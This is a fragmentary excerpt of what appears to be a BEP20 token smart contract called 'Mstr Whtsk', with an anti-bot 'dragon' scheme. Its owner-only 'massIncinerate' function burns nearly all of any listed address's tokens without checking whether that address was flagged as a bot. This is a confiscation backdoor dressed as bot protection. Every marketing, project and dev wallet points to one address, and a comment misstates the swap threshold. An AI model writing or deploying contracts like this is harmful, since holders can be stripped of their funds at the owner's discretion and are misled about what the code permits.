...
abstract contract Auth {
    ...
    address public adminOne      = 0x5aFf7F8fD64eCFEb65Ab39BD96D878bD21652226;
...
contract Mister is IBEP20, Auth {
    // LIBRARIES
    using SafeMath for uint256;
    using SafeBEP20 for IBEP20;

    // MAIN WALLET ADDRESSES
    address MKT                    = 0x66aFEa41AEA93C1c14570DbE71415456C9c8cE17;
    address PROJECT                = 0x66aFEa41AEA93C1c14570DbE71415456C9c8cE17;
    address DEV                    = 0x66aFEa41AEA93C1c14570DbE71415456C9c8cE17;
    address TOKEN_B                = 0x66aFEa41AEA93C1c14570DbE71415456C9c8cE17;

    // TOKEN GLOBAL VARIABLES
    string constant _name = "Mstr Whtsk";
    ...
    uint256 public  _maxBuyAmount = (_totalSupply * 1) / 1000;
    ...
    uint256 public swapThreshold = 100000 ether; // 1 token minimum
    bool inSwap;
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        // DRAKARYS
        if (queueEnabled) { 
            require(liquidityAddress[sender] || liquidityAddress[recipient], "Do not try to fool the dragons");
    ...
    function checkDragon(address sender, address recipient, uint256 amount) internal {
        // IN CASE THE BOT IMEDIATELY SELLS EVEYTHING AFTER BUYING
    ...
    // SENDS THE DEAD TOKENS TO THE DEAD WALLET
    function incinerate(address _lostSoul) external onlyOwner {
        uint256 balance = balanceOf(_lostSoul) - 1 ether;
        require(_caughtAt[_lostSoul] > 0,"This user was not caught by the Dragons");
        require(balance > 0, "Insufficient balance");
        if (balance > 0) {
            _basicTransfer(_lostSoul, DEAD, balance);
        }
    }

    function massIncinerate(address[] calldata addresses) external onlyOwner {
        for(uint i=0; i < addresses.length; i++){
            uint256 balance = (balanceOf(addresses[i]) - 1 ether);
            if (balance > 0) {
                _basicTransfer(addresses[i], DEAD, balance);
            }
        }
    }
